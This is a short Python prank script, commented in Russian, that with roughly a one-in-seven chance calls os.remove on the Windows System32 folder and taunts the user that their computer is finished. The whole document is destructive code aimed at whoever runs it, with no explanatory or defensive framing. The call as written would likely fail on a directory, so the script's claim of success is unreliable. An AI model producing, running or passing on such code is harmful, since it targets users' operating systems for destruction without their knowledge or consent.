import random
import os
if random.randint(0,6) == 1:
    os.remove("C:\Windows\System32")
    print("Ой - ой. Кажется, твоему компу конец :)")
else:
    print("Хм. Повезло тебе.")
